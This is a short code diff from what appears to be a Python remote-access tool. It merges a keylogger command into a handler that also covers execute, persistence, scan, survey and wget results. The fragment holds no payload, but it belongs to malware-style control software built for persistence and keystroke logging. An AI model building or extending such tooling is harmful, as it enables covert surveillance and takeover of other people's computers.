@@ -124,13 +124,7 @@ class ClientConnection(common.Client):
         #     self.dh_key = crypto.diffiehellman(self.conn)
 
         # results of execute, persistence, scan, survey, unzip, or wget
-        elif cmd in ['execute', 'persistence', 'scan', 'survey', 'unzip', 'wget']:
-            print 'Running {}...'.format(cmd)
-            recv_data = self.recvGCM().rstrip()
-            print recv_data
-
-        # WGET DU KEYLOGGER
-        elif cmd in ['keylogger']:
+        elif cmd in ['execute', 'persistence', 'scan', 'survey', 'unzip', 'wget', 'keylogger']:
             print 'Running {}...'.format(cmd)
             recv_data = self.recvGCM().rstrip()
             print recv_data
